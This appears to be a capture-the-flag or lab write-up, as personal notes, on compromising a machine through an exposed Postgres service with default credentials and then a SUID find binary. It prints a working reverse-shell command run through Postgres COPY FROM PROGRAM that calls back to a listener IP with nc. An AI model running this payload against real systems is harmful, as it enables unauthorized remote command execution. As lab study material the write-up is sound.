#postgres #psql #port5437 #suid-find 

>[!code]- Find open ports (21, 22, 80, 5437)
>![Pasted image 20241002060947](/Images/Pasted%20image%2020241002060947.png)
#### local
###### Postgres (port 5437)

>[!code]- Access database with default credentials
>###### Connect
>![Pasted image 20241002062014](/Images/Pasted%20image%2020241002062014.png)
>###### Postgres user is superuser
>![Pasted image 20241002062333](/Images/Pasted%20image%2020241002062333.png)
>###### Use superuser privileges to list arbitrary file contents
>(`\l`) list available databases 
>(`\c`) connect to postgres database first
>
>![Pasted image 20241002063524](/Images/Pasted%20image%2020241002063524.png)

>[!code]- Obtain a reverse shell via Postgres
>_(Supported versions 9.3 – 14)_
>###### As per [this guide](https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767), create a table
>![Pasted image 20241002064535](/Images/Pasted%20image%2020241002064535.png)
>```sql
>CREATE TABLE shell(output text);
>```
>###### Execute reverse shell (first one didn't work)
>![Pasted image 20241002064727](/Images/Pasted%20image%2020241002064727.png)
>```sql
>COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.240 80 >/tmp/f';
>```
>###### Catch on the listener
>![Pasted image 20241002064752](/Images/Pasted%20image%2020241002064752.png)

>[!success]- Obtain local.txt
>![Pasted image 20241002064849](/Images/Pasted%20image%2020241002064849.png)
#### root

>[!code]- SUID bit set on find binary
>###### Find binaries with SUID bit set
>![Pasted image 20241028061908](/Images/Pasted%20image%2020241028061908.png)
>###### Exploit find binary
>![Pasted image 20241028061947](/Images/Pasted%20image%2020241028061947.png)

>[!success]- Obtain proof.txt
>![Pasted image 20241028062028](/Images/Pasted%20image%2020241028062028.png)

